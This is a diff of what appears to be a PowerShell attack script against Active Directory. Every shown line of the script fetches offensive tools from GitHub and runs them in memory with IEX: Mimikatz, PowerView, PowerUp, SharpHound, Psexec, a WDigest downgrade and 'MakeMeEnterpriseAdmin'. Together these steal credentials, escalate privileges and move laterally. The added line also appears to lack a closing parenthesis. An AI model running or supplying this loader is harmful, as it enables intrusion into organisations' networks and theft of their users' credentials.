@@ -14,22 +14,17 @@ $Users = Get-ADUser -filter { Enabled -eq $True -and PasswordNeverExpires -eq $F
 
 $browser = New-Object System.Net.WebClient;
 $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
-
 IEX($browser.DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'));
-
 IEX($browser.DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1'));
-
 IEX($browser.DownloadString('https://raw.githubusercontent.com/PowershellMafia/PowerSploit/dev/Recon/PowerView.ps1'));
-
 IEX($browser.DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'));
-
 IEX($browser.DownloadString('https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1'));Invoke-Privesc -Groups 'Users,Everyone,Authenticated Users' -Mode full -Extended
 
 IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/Invoke-Psexec.ps1'));
 IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/Invoke-WdigestDowngrade.ps1'));
 IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/MakeMeEnterpriseAdmin.ps1'));
 IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/Seatbelt.ps1'));
-IEX($browser.DownloadString(''));
+IEX($browser.DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 IEX($browser.DownloadString(''));
 IEX($browser.DownloadString(''));
 IEX($browser.DownloadString(''));
